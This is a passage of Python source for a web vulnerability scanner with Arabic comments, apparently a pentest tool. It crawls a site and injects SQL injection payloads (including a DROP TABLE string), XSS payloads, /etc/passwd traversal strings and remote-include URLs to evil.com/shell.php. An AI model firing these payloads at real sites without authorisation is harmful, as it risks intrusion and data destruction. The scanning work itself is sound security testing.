#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
وحدة فحص الثغرات الأمنية
'''

import re
import json
import time
import random
import requests
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings()

class VulnerabilityScanner:
    def __init__(self, target_info, open_ports, deep_scan=False, verbose=False):
        self.target = target_info['target']
        self.domain = target_info['domain']
        self.ip = target_info['ip']
        self.open_ports = open_ports
        self.deep_scan = deep_scan
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        
        # قائمة الثغرات المعروفة للفحص
        self.vulnerability_checks = [
            self.check_sql_injection,
            self.check_xss,
            self.check_csrf,
            self.check_open_redirect,
            self.check_file_inclusion,
            self.check_file_upload,
            self.check_information_disclosure,
            self.check_insecure_headers,
            self.check_outdated_software
        ]
        
        # قائمة المسارات الحساسة للفحص
        self.sensitive_paths = [
            '/admin', '/login', '/wp-admin', '/administrator', '/phpmyadmin',
            '/config', '/backup', '/db', '/database', '/logs', '/tmp', '/dev',
            '/.git', '/.env', '/api', '/api/v1', '/api/v2', '/swagger',
            '/actuator', '/console', '/debug', '/status', '/server-status',
            '/wp-config.php', '/config.php', '/configuration.php', '/settings.php',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml'
        ]
    
    # الدالة الرئيسية للفحص
    def scan(self):
        print(f"{Fore.BLUE}[*] بدء عملية الزحف وجمع المعلومات...{Style.RESET_ALL}")
        self.crawl(self.target, depth=2 if self.deep_scan else 1)
        
        print(f"{Fore.BLUE}[*] تم العثور على {len(self.crawled_urls)} رابط و {len(self.forms)} نموذج.{Style.RESET_ALL}")
        
        print(f"{Fore.BLUE}[*] فحص المسارات الحساسة...{Style.RESET_ALL}")
        self.check_sensitive_paths()
        
        print(f"{Fore.BLUE}[*] فحص الثغرات الأمنية...{Style.RESET_ALL}")
        with ThreadPoolExecutor(max_workers=5) as executor:
            # فحص الثغرات في الروابط
            for url in self.crawled_urls:
                for check in self.vulnerability_checks:
                    executor.submit(check, url)
                    # إضافة تأخير بسيط لتجنب الحظر
                    time.sleep(0.5)
            
            # فحص الثغرات في النماذج
            for form in self.forms:
                executor.submit(self.check_form_vulnerabilities, form)
        
        # فحص ثغرات المنافذ المفتوحة
        self.check_port_vulnerabilities()
        
        return self.vulnerabilities
    
    # زحف الموقع وجمع الروابط والنماذج
    def crawl(self, url, depth=1):
        if depth <= 0 or url in self.crawled_urls:
            return
        
        try:
            if self.verbose:
                print(f"{Fore.CYAN}[*] زحف: {url}{Style.RESET_ALL}")
            
            response = self.session.get(url, verify=False, timeout=10)
            self.crawled_urls.add(url)
            
            # استخراج النماذج
            self.extract_forms(url, response.text)
            
            # استخراج الروابط
            if depth > 1:
                links = self.extract_links(url, response.text)
                for link in links:
                    if link not in self.crawled_urls and self.is_same_domain(link):
                        # إضافة تأخير بسيط لتجنب الحظر
                        time.sleep(random.uniform(0.5, 1.5))
                        self.crawl(link, depth - 1)
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء الزحف إلى {url}: {str(e)}{Style.RESET_ALL}")
    
    # استخراج الروابط من صفحة HTML
    def extract_links(self, base_url, html_content):
        links = set()
        # نمط للبحث عن الروابط في HTML
        href_pattern = re.compile(r'href=["\']([^"\']+)["\']')
        for match in href_pattern.finditer(html_content):
            link = match.group(1)
            # تجاهل الروابط الخاصة بالهاش والجافاسكربت
            if link.startswith('#') or link.startswith('javascript:'):
                continue
            # تحويل الروابط النسبية إلى روابط مطلقة
            absolute_link = urljoin(base_url, link)
            links.add(absolute_link)
        return links
    
    # استخراج النماذج من صفحة HTML
    def extract_forms(self, url, html_content):
        # نمط للبحث عن النماذج في HTML
        form_pattern = re.compile(r'<form.*?action=["\']([^"\']*)["\'].*?>(.*?)</form>', re.DOTALL)
        input_pattern = re.compile(r'<input.*?name=["\']([^"\']*)["\'].*?type=["\']([^"\']*)["\'].*?>', re.DOTALL)
        
        for form_match in form_pattern.finditer(html_content):
            action = form_match.group(1)
            form_content = form_match.group(2)
            
            # تحويل مسار النموذج إلى رابط مطلق
            form_action = urljoin(url, action) if action else url
            
            # استخراج حقول الإدخال
            inputs = {}
            for input_match in input_pattern.finditer(form_content):
                input_name = input_match.group(1)
                input_type = input_match.group(2)
                if input_name:
                    inputs[input_name] = input_type
            
            # تحديد طريقة الإرسال (GET أو POST)
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_content, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'GET'
            
            self.forms.append({
                'action': form_action,
                'method': method,
                'inputs': inputs
            })
    
    # التحقق من أن الرابط ينتمي لنفس النطاق
    def is_same_domain(self, url):
        parsed_url = urlparse(url)
        return parsed_url.netloc == self.domain or parsed_url.netloc.endswith('.' + self.domain)
    
    # فحص المسارات الحساسة
    def check_sensitive_paths(self):
        for path in self.sensitive_paths:
            url = urljoin(self.target, path)
            try:
                response = self.session.get(url, verify=False, timeout=5, allow_redirects=False)
                
                if 200 <= response.status_code < 300 or response.status_code == 403:
                    self.add_vulnerability({
                        'name': 'كشف مسار حساس',
                        'severity': 'متوسطة' if response.status_code == 200 else 'منخفضة',
                        'description': f'تم العثور على مسار حساس: {path} (الحالة: {response.status_code})',
                        'path': url,
                        'details': {
                            'status_code': response.status_code,
                            'content_length': len(response.content),
                            'headers': dict(response.headers)
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] تم العثور على مسار حساس: {url} (الحالة: {response.status_code}){Style.RESET_ALL}")
            
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] خطأ أثناء فحص المسار {url}: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات حقن SQL
    def check_sql_injection(self, url):
        # قائمة بأنماط حقن SQL للاختبار
        sql_payloads = [
            "' OR '1'='1", 
            "' OR '1'='1' --", 
            "\" OR \"1\"=\"1", 
            "1' OR '1'='1", 
            "admin' --", 
            "1; DROP TABLE users", 
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --"
        ]
        
        # إضافة معلمة للاختبار إذا لم تكن موجودة
        if '?' not in url:
            test_url = url + '?id=1'
        else:
            test_url = url
        
        try:
            # الحصول على الاستجابة الأصلية للمقارنة
            original_response = self.session.get(test_url, verify=False, timeout=10)
            original_content_length = len(original_response.content)
            
            for payload in sql_payloads:
                # إنشاء عنوان URL مع الحمولة
                if '?' in test_url:
                    # إضافة الحمولة إلى المعلمات الموجودة
                    parts = test_url.split('?')
                    base = parts[0]
                    params = parts[1].split('&')
                    new_params = []
                    for param in params:
                        if '=' in param:
                            name, value = param.split('=', 1)
                            new_params.append(f"{name}={value}{payload}")
                        else:
                            new_params.append(param)
                    inject_url = f"{base}?{'&'.join(new_params)}"
                else:
                    # إضافة معلمة جديدة مع الحمولة
                    inject_url = f"{test_url}?id={payload}"
                
                try:
                    response = self.session.get(inject_url, verify=False, timeout=10)
                    
                    # البحث عن علامات حقن SQL ناجح
                    sql_errors = [
                        "SQL syntax", "mysql_fetch", "ORA-", "Oracle Error",
                        "Microsoft SQL Server", "PostgreSQL", "SQLite", "syntax error"
                    ]
                    
                    content = response.text.lower()
                    content_diff = abs(len(response.content) - original_content_length)
                    
                    # التحقق من وجود رسائل خطأ SQL أو تغيير كبير في المحتوى
                    if any(error.lower() in content for error in sql_errors) or content_diff > 500:
                        self.add_vulnerability({
                            'name': 'ثغرة حقن SQL',
                            'severity': 'عالية',
                            'description': 'تم اكتشاف ثغرة حقن SQL محتملة. يمكن استغلال هذه الثغرة للوصول غير المصرح به إلى قاعدة البيانات.',
                            'path': inject_url,
                            'details': {
                                'payload': payload,
                                'response_diff': content_diff,
                                'error_detected': any(error.lower() in content for error in sql_errors)
                            }
                        })
                        
                        if self.verbose:
                            print(f"{Fore.RED}[+] تم اكتشاف ثغرة حقن SQL محتملة: {inject_url}{Style.RESET_ALL}")
                        
                        # التوقف بعد العثور على ثغرة
                        break
                
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار حقن SQL على {inject_url}: {str(e)}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار حقن SQL: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات XSS
    def check_xss(self, url):
        # قائمة بأنماط XSS للاختبار
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"'><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        # إضافة معلمة للاختبار إذا لم تكن موجودة
        if '?' not in url:
            test_url = url + '?xss=test'
        else:
            test_url = url
        
        try:
            for payload in xss_payloads:
                # إنشاء عنوان URL مع الحمولة
                if '?' in test_url:
                    # إضافة الحمولة إلى المعلمات الموجودة
                    parts = test_url.split('?')
                    base = parts[0]
                    params = parts[1].split('&')
                    new_params = []
                    for param in params:
                        if '=' in param:
                            name, value = param.split('=', 1)
                            new_params.append(f"{name}={payload}")
                        else:
                            new_params.append(param)
                    inject_url = f"{base}?{'&'.join(new_params)}"
                else:
                    # إضافة معلمة جديدة مع الحمولة
                    inject_url = f"{test_url}?xss={payload}"
                
                try:
                    response = self.session.get(inject_url, verify=False, timeout=10)
                    
                    # التحقق من وجود الحمولة في الاستجابة
                    if payload in response.text:
                        self.add_vulnerability({
                            'name': 'ثغرة XSS',
                            'severity': 'عالية',
                            'description': 'تم اكتشاف ثغرة Cross-Site Scripting (XSS) محتملة. يمكن استغلال هذه الثغرة لتنفيذ سكربتات ضارة في متصفح المستخدم.',
                            'path': inject_url,
                            'details': {
                                'payload': payload,
                                'reflected': True
                            }
                        })
                        
                        if self.verbose:
                            print(f"{Fore.RED}[+] تم اكتشاف ثغرة XSS محتملة: {inject_url}{Style.RESET_ALL}")
                        
                        # التوقف بعد العثور على ثغرة
                        break
                
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار XSS على {inject_url}: {str(e)}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار XSS: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات CSRF
    def check_csrf(self, url):
        try:
            response = self.session.get(url, verify=False, timeout=10)
            
            # البحث عن نماذج في الصفحة
            if '<form' in response.text.lower():
                # التحقق من وجود رمز CSRF
                csrf_tokens = [
                    'csrf', 'xsrf', 'token', '_token', 'authenticity_token',
                    'csrf_token', 'xsrf_token', 'security_token'
                ]
                
                has_csrf = False
                for token in csrf_tokens:
                    if token in response.text.lower():
                        has_csrf = True
                        break
                
                if not has_csrf:
                    self.add_vulnerability({
                        'name': 'ثغرة CSRF',
                        'severity': 'متوسطة',
                        'description': 'تم اكتشاف نموذج بدون حماية CSRF. يمكن استغلال هذه الثغرة لتنفيذ طلبات غير مصرح بها نيابة عن المستخدم.',
                        'path': url,
                        'details': {
                            'has_form': True,
                            'has_csrf_token': False
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.YELLOW}[+] تم اكتشاف ثغرة CSRF محتملة: {url}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار CSRF: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات إعادة التوجيه المفتوح
    def check_open_redirect(self, url):
        # قائمة بمعلمات إعادة التوجيه الشائعة
        redirect_params = ['redirect', 'url', 'next', 'redir', 'return', 'to', 'goto', 'link', 'target']
        
        # قائمة بأنماط إعادة التوجيه للاختبار
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            'https:evil.com',
            'javascript:alert(document.domain)'
        ]
        
        try:
            # التحقق من وجود معلمات إعادة التوجيه في الرابط
            parsed_url = urlparse(url)
            query_params = parsed_url.query.split('&')
            
            for param in query_params:
                if '=' in param:
                    name, value = param.split('=', 1)
                    if name.lower() in redirect_params:
                        for payload in redirect_payloads:
                            # إنشاء عنوان URL مع الحمولة
                            new_params = []
                            for p in query_params:
                                if p.startswith(name + '='):
                                    new_params.append(f"{name}={payload}")
                                else:
                                    new_params.append(p)
                            
                            redirect_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join(new_params)}"
                            
                            try:
                                response = self.session.get(redirect_url, verify=False, timeout=10, allow_redirects=False)
                                
                                # التحقق من وجود رمز إعادة التوجيه وعنوان URL الضار في الرأس
                                if response.status_code in [301, 302, 303, 307, 308] and \
                                   'location' in response.headers and \
                                   (payload in response.headers['location'] or \
                                    payload.replace('https:', '') in response.headers['location']):
                                    
                                    self.add_vulnerability({
                                        'name': 'ثغرة إعادة التوجيه المفتوح',
                                        'severity': 'متوسطة',
                                        'description': 'تم اكتشاف ثغرة إعادة التوجيه المفتوح. يمكن استغلال هذه الثغرة لإعادة توجيه المستخدمين إلى مواقع ضارة.',
                                        'path': redirect_url,
                                        'details': {
                                            'payload': payload,
                                            'redirect_to': response.headers['location']
                                        }
                                    })
                                    
                                    if self.verbose:
                                        print(f"{Fore.YELLOW}[+] تم اكتشاف ثغرة إعادة التوجيه المفتوح: {redirect_url}{Style.RESET_ALL}")
                                    
                                    # التوقف بعد العثور على ثغرة
                                    break
                            
                            except Exception as e:
                                if self.verbose:
                                    print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار إعادة التوجيه المفتوح على {redirect_url}: {str(e)}{Style.RESET_ALL}")
            
            # إضافة معلمة إعادة التوجيه إذا لم تكن موجودة
            if not any(param.split('=')[0] in redirect_params for param in query_params if '=' in param):
                for param in redirect_params:
                    for payload in redirect_payloads:
                        if '?' in url:
                            redirect_url = f"{url}&{param}={payload}"
                        else:
                            redirect_url = f"{url}?{param}={payload}"
                        
                        try:
                            response = self.session.get(redirect_url, verify=False, timeout=10, allow_redirects=False)
                            
                            # التحقق من وجود رمز إعادة التوجيه وعنوان URL الضار في الرأس
                            if response.status_code in [301, 302, 303, 307, 308] and \
                               'location' in response.headers and \
                               (payload in response.headers['location'] or \
                                payload.replace('https:', '') in response.headers['location']):
                                
                                self.add_vulnerability({
                                    'name': 'ثغرة إعادة التوجيه المفتوح',
                                    'severity': 'متوسطة',
                                    'description': 'تم اكتشاف ثغرة إعادة التوجيه المفتوح. يمكن استغلال هذه الثغرة لإعادة توجيه المستخدمين إلى مواقع ضارة.',
                                    'path': redirect_url,
                                    'details': {
                                        'payload': payload,
                                        'redirect_to': response.headers['location']
                                    }
                                })
                                
                                if self.verbose:
                                    print(f"{Fore.YELLOW}[+] تم اكتشاف ثغرة إعادة التوجيه المفتوح: {redirect_url}{Style.RESET_ALL}")
                                
                                # التوقف بعد العثور على ثغرة
                                break
                        
                        except Exception as e:
                            if self.verbose:
                                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار إعادة التوجيه المفتوح على {redirect_url}: {str(e)}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار إعادة التوجيه المفتوح: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات تضمين الملفات
    def check_file_inclusion(self, url):
        # قائمة بمعلمات تضمين الملفات الشائعة
        file_params = ['file', 'page', 'include', 'doc', 'path', 'name', 'view', 'content']
        
        # قائمة بأنماط تضمين الملفات للاختبار
        lfi_payloads = [
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../windows/win.ini',
            '../../../../../../../../../../boot.ini'
        ]
        
        rfi_payloads = [
            'http://evil.com/shell.php',
            'https://evil.com/shell.php',
            'http://evil.com/shell.php%00',
            'https://evil.com/shell.php%00'
        ]
        
        try:
            # التحقق من وجود معلمات تضمين الملفات في الرابط
            parsed_url = urlparse(url)
            query_params = parsed_url.query.split('&')
            
            for param in query_params:
                if '=' in param:
                    name, value = param.split('=', 1)
                    if name.lower() in file_params:
                        # اختبار LFI
                        for payload in lfi_payloads:
                            # إنشاء عنوان URL مع الحمولة
                            new_params = []
                            for p in query_params:
                                if p.startswith(name + '='):
                                    new_params.append(f"{name}={payload}")
                                else:
                                    new_params.append(p)
                            
                            lfi_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join(new_params)}"
                            
                            try:
                                response = self.session.get(lfi_url, verify=False, timeout=10)
                                
                                # التحقق من وجود علامات LFI ناجح
                                lfi_patterns = [
                                    'root:x:', 'bin:', 'daemon:', 'mail:', 'nobody:', 'www-data:',
                                    '[boot loader]', '[operating systems]', '[fonts]', '[extensions]'
                                ]
                                
                                if any(pattern in response.text for pattern in lfi_patterns):
                                    self.add_vulnerability({
                                        'name': 'ثغرة تضمين الملفات المحلية (LFI)',
                                        'severity': 'عالية',
                                        'description': 'تم اكتشاف ثغرة تضمين الملفات المحلية. يمكن استغلال هذه الثغرة للوصول إلى ملفات النظام الحساسة.',
                                        'path': lfi_url,
                                        'details': {
                                            'payload': payload,
                                            'evidence': [pattern for pattern in lfi_patterns if pattern in response.text]
                                        }
                                    })
                                    
                                    if self.verbose:
                                        print(f"{Fore.RED}[+] تم اكتشاف ثغرة تضمين الملفات المحلية: {lfi_url}{Style.RESET_ALL}")
                                    
                                    # التوقف بعد العثور على ثغرة
                                    break
                            
                            except Exception as e:
                                if self.verbose:
                                    print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار LFI على {lfi_url}: {str(e)}{Style.RESET_ALL}")
                        
                        # اختبار RFI
                        for payload in rfi_payloads:
                            # إنشاء عنوان URL مع الحمولة
                            new_params = []
                            for p in query_params:
                                if p.startswith(name + '='):
                                    new_params.append(f"{name}={payload}")
                                else:
                                    new_params.append(p)
                            
                            rfi_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{'&'.join(new_params)}"
                            
                            try:
                                response = self.session.get(rfi_url, verify=False, timeout=10)
                                
                                # التحقق من وجود علامات RFI ناجح (صعب التحقق بدون خادم حقيقي)
                                if 'evil.com' in response.text or 'shell.php' in response.text:
                                    self.add_vulnerability({
                                        'name': 'ثغرة تضمين الملفات البعيدة (RFI)',
                                        'severity': 'عالية',
                                        'description': 'تم اكتشاف ثغرة تضمين الملفات البعيدة. يمكن استغلال هذه الثغرة لتنفيذ تعليمات برمجية ضارة من مصادر خارجية.',
                                        'path': rfi_url,
                                        'details': {
                                            'payload': payload
                                        }
                                    })
                                    
                                    if self.verbose:
                                        print(f"{Fore.RED}[+] تم اكتشاف ثغرة تضمين الملفات البعيدة: {rfi_url}{Style.RESET_ALL}")
                                    
                                    # التوقف بعد العثور على ثغرة
                                    break
                            
                            except Exception as e:
                                if self.verbose:
                                    print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار RFI على {rfi_url}: {str(e)}{Style.RESET_ALL}")
            
            # إضافة معلمة تضمين الملفات إذا لم تكن موجودة
            if not any(param.split('=')[0] in file_params for param in query_params if '=' in param):
                for param in file_params[:2]:  # اختبار أول معلمتين فقط لتقليل الطلبات
                    for payload in lfi_payloads[:2]:  # اختبار أول حمولتين فقط لتقليل الطلبات
                        if '?' in url:
                            lfi_url = f"{url}&{param}={payload}"
                        else:
                            lfi_url = f"{url}?{param}={payload}"
                        
                        try:
                            response = self.session.get(lfi_url, verify=False, timeout=10)
                            
                            # التحقق من وجود علامات LFI ناجح
                            lfi_patterns = [
                                'root:x:', 'bin:', 'daemon:', 'mail:', 'nobody:', 'www-data:',
                                '[boot loader]', '[operating systems]', '[fonts]', '[extensions]'
                            ]
                            
                            if any(pattern in response.text for pattern in lfi_patterns):
                                self.add_vulnerability({
                                    'name': 'ثغرة تضمين الملفات المحلية (LFI)',
                                    'severity': 'عالية',
                                    'description': 'تم اكتشاف ثغرة تضمين الملفات المحلية. يمكن استغلال هذه الثغرة للوصول إلى ملفات النظام الحساسة.',
                                    'path': lfi_url,
                                    'details': {
                                        'payload': payload,
                                        'evidence': [pattern for pattern in lfi_patterns if pattern in response.text]
                                    }
                                })
                                
                                if self.verbose:
                                    print(f"{Fore.RED}[+] تم اكتشاف ثغرة تضمين الملفات المحلية: {lfi_url}{Style.RESET_ALL}")
                                
                                # التوقف بعد العثور على ثغرة
                                break
                        
                        except Exception as e:
                            if self.verbose:
                                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار LFI على {lfi_url}: {str(e)}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار تضمين الملفات: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات رفع الملفات
    def check_file_upload(self, url):
        try:
            response = self.session.get(url, verify=False, timeout=10)
            
            # البحث عن نماذج رفع الملفات في الصفحة
            if 'enctype="multipart/form-data"' in response.text or 'type="file"' in response.text:
                # التحقق من وجود تحقق من نوع الملف
                file_checks = [
                    'accept=".jpg', 'accept=".png', 'accept="image', 'accept=".pdf',
                    '.jpg', '.png', '.gif', '.pdf', 'image/jpeg', 'image/png', 'application/pdf'
                ]
                
                has_file_check = False
                for check in file_checks:
                    if check in response.text:
                        has_file_check = True
                        break
                
                if not has_file_check:
                    self.add_vulnerability({
                        'name': 'ثغرة رفع الملفات',
                        'severity': 'عالية',
                        'description': 'تم اكتشاف نموذج رفع ملفات بدون تحقق كافٍ من نوع الملف. يمكن استغلال هذه الثغرة لرفع ملفات ضارة.',
                        'path': url,
                        'details': {
                            'has_file_upload': True,
                            'has_file_type_check': False
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.RED}[+] تم اكتشاف ثغرة رفع الملفات: {url}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار رفع الملفات: {str(e)}{Style.RESET_ALL}")
    
    # فحص ثغرات كشف المعلومات
    def check_information_disclosure(self, url):
        try:
            response = self.session.get(url, verify=False, timeout=10)
            
            # البحث عن معلومات حساسة في الصفحة
            sensitive_info = [
                {'pattern': r'DB_PASSWORD\s*=\s*["\']([^"\']*)["\']\'', 'name': 'كلمة مرور قاعدة البيانات'},
                {'pattern': r'API_KEY\s*=\s*["\']([^"\']*)["\']\'', 'name': 'مفتاح API'},
                {'pattern': r'SECRET_KEY\s*=\s*["\']([^"\']*)["\']\'', 'name': 'مفتاح سري'},
                {'pattern': r'PASSWORD\s*=\s*["\']([^"\']*)["\']\'', 'name': 'كلمة مرور'},
                {'pattern': r'AWS_SECRET\s*=\s*["\']([^"\']*)["\']\'', 'name': 'مفتاح AWS السري'},
                {'pattern': r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', 'name': 'عنوان بريد إلكتروني'},
                {'pattern': r'\b\d{3}-\d{2}-\d{4}\b', 'name': 'رقم الضمان الاجتماعي (SSN)'},
                {'pattern': r'\b(?:\d[ -]*?){13,16}\b', 'name': 'رقم بطاقة ائتمان محتمل'}
            ]
            
            for info in sensitive_info:
                matches = re.findall(info['pattern'], response.text)
                if matches:
                    self.add_vulnerability({
                        'name': 'كشف معلومات حساسة',
                        'severity': 'متوسطة',
                        'description': f'تم اكتشاف معلومات حساسة ({info["name"]}) في الصفحة. يمكن أن يؤدي ذلك إلى تسرب معلومات حساسة.',
                        'path': url,
                        'details': {
                            'info_type': info['name'],
                            'matches_count': len(matches)
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.YELLOW}[+] تم اكتشاف كشف معلومات حساسة ({info['name']}): {url}{Style.RESET_ALL}")
            
            # التحقق من وجود تعليقات HTML تحتوي على معلومات حساسة
            comments = re.findall(r'<!--(.+?)-->', response.text, re.DOTALL)
            sensitive_comment_keywords = ['password', 'username', 'todo', 'fix', 'bug', 'hack', 'workaround', 'backdoor', 'debug']
            
            for comment in comments:
                if any(keyword in comment.lower() for keyword in sensitive_comment_keywords):
                    self.add_vulnerability({
                        'name': 'تعليقات HTML حساسة',
                        'severity': 'منخفضة',
                        'description': 'تم اكتشاف تعليقات HTML تحتوي على معلومات حساسة. يمكن أن تكشف هذه التعليقات عن معلومات داخلية أو ثغرات أمنية.',
                        'path': url,
                        'details': {
                            'comment': comment[:100] + '...' if len(comment) > 100 else comment
                        }
                    })
                    
                    if self.verbose:
                        print(f"{Fore.YELLOW}[+] تم اكتشاف تعليقات HTML حساسة: {url}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار كشف المعلومات: {str(e)}{Style.RESET_ALL}")
    
    # فحص رؤوس HTTP غير آمنة
    def check_insecure_headers(self, url):
        try:
            response = self.session.get(url, verify=False, timeout=10)
            headers = response.headers
            
            # قائمة برؤوس الأمان المهمة
            security_headers = {
                'Strict-Transport-Security': 'يحمي من هجمات الوسيط (MitM) وخفض البروتوكول',
                'X-Frame-Options': 'يحمي من هجمات clickjacking',
                'X-Content-Type-Options': 'يحمي من هجمات MIME sniffing',
                'Content-Security-Policy': 'يحمي من هجمات XSS وحقن البيانات',
                'X-XSS-Protection': 'يحمي من هجمات XSS',
                'Referrer-Policy': 'يتحكم في معلومات الإحالة المرسلة',
                'Feature-Policy': 'يتحكم في ميزات المتصفح المتاحة',
                'Permissions-Policy': 'يتحكم في ميزات المتصفح المتاحة (بديل Feature-Policy)'                
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in headers:
                    missing_headers.append({'header': header, 'description': description})
            
            if missing_headers:
                self.add_vulnerability({
                    'name': 'رؤوس HTTP أمنية مفقودة',
                    'severity': 'منخفضة',
                    'description': 'تم اكتشاف رؤوس HTTP أمنية مفقودة. يمكن أن يؤدي ذلك إلى زيادة مخاطر الهجمات المختلفة.',
                    'path': url,
                    'details': {
                        'missing_headers': missing_headers
                    }
                })
                
                if self.verbose:
                    print(f"{Fore.YELLOW}[+] تم اكتشاف رؤوس HTTP أمنية مفقودة: {url}{Style.RESET_ALL}")
            
            # التحقق من وجود رؤوس تكشف معلومات حساسة
            sensitive_headers = [
                'Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Runtime',
                'X-Version', 'X-Generator', 'X-Drupal-Cache', 'X-Varnish'
            ]
            
            exposed_headers = []
            for header in sensitive_headers:
                if header in headers:
                    exposed_headers.append({'header': header, 'value': headers[header]})
            
            if exposed_headers:
                self.add_vulnerability({
                    'name': 'كشف معلومات في رؤوس HTTP',
                    'severity': 'منخفضة',
                    'description': 'تم اكتشاف رؤوس HTTP تكشف معلومات حساسة عن البنية التحتية. يمكن استخدام هذه المعلومات لتحديد إصدارات البرامج واستهداف ثغرات معروفة.',
                    'path': url,
                    'details': {
                        'exposed_headers': exposed_headers
                    }
                })
                
                if self.verbose:
                    print(f"{Fore.YELLOW}[+] تم اكتشاف كشف معلومات في رؤوس HTTP: {url}{Style.RESET_ALL}")
        
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] خطأ أثناء اختبار رؤوس HTTP: {str(e)}{Style.RESET_ALL}")
    
    # فحص البرامج القديمة
    def check_outdated_software(self, url):
        try:
            response = self.session.get(url, verify=False, timeout=10)
            headers = response.headers
            content = response.text.lower()
            
            # البحث عن إشارات للبرامج وإصداراتها
            software_patterns = [
                {'pattern': r'wordpress\s+([\d\.]+)', 'name': 'WordPress', 'latest': '5.9'},
                {'pattern': r'joomla\s+([\d\.]+)', 'name': 'Joomla', 'latest': '4.1'},
                {'pattern': r'drupal\s+([\d\.]+)', 'name': 'Drupal', 'latest': '9.3'},
                {'pattern': r'php/([\d\.]+)', 'name': 'PHP', 'latest': '8.1'},
                {'pattern': r'apache/([\d\.]+)', 'name': 'Apache', 'latest': '2.4.52'},
                {'pattern': r'nginx/([\d\.]+)', 'name': 'Nginx', 'latest': '1.21'},
                {'pattern': r'jquery\s+v?([\d\.]+)', 'name': 'jQuery', 'latest': '3.6'},
                {'pattern': r'bootstrap\s+v?([\d\.]+)', 'name': 'Bootstrap', 'latest': '5.1'}
            ]
            
            # التحقق من رؤوس HTTP
            server = headers.get('Server', '')
            powered_by = headers.get('X-Powered-By', '')
            
            outdated_software = []
            
            # التحقق من البرامج في رؤوس HTTP
            for pattern in software_patterns:
                # البحث في رأس Server
                matches = re.findall(pattern['pattern'], server, re.IGNORECASE)
                if matches:
                    version = matches[0]
                    if self.is_outdated_version(version, pattern['latest']):
                        outdated_software.append({
                            'name': pattern['name'],
                            'version': version,
                            'latest': pattern['latest'],
                            'source': 'Server header'
                        })
                
                # البحث في رأس X-Powered-By
                matches = re.findall(pattern['pattern'], powered_by, re.IGNORECASE)
                if matches:
                    version = matches[0]
                    if self.is_outdated_version(version, pattern['latest']):
                        outdated_software.append({
                            'name': pattern['name'],
                            'version': version,
                            'latest': pattern['latest'],
                            'source': 'X-Powered-By header'
                        })
                
                # البحث في محتوى الصفحة
                matches = re.findall(pattern['pattern'], content, re.IGNORECASE)
                if matches:
                    version = matches[0]
                    if self.is_outdated_version(version, pattern['latest']):
                        outdated_software.append({
                            'name': pattern['name'],
                            'version': version,
                            'latest': pattern['latest'],
                            'source': 'Page content'
                        })
            
